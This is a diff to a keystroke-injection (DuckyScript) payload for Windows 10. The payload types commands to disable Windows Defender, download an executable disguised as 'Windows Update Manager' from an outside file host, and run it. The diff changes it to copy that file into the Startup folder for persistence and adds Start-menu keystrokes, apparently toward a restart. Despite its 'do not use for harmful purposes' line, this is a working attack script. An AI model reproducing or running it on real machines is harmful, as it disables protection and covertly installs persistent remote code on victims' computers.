@@ -1,6 +1,6 @@
 REM AUTHOR: Eddie Devine
 REM TARGET: Windows 10
-REM DESCRIPTION: Installs and runs Enderman's WindowsUpdate.exe.
+REM DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
 REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 
 REM Disable Windows Defender:
@@ -67,16 +67,27 @@ ALT y
 DELAY 1000
 STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
 ENTER
-STRING $outpath = "C:\Windows_Update_Manager.exe"
+STRING $outpath = "C:\Windows Update Manager.exe"
 ENTER
 STRING Invoke-WebRequest -Uri $url -OutFile $outpath
 ENTER
 DELAY 1000
-STRING cd ..
-ENTER
-STRING cd..
-ENTER
-STRING start Windows_Update_Manager.exe
-ENTER
 STRING exit
+ENTER
+GUI r
+DELAY 500
+STRING cmd /c copy "C:\Windows Update Manager.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+ENTER
+GUI
+DELAY 100
+TAB
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 100
+DOWN
+DOWN
 ENTER
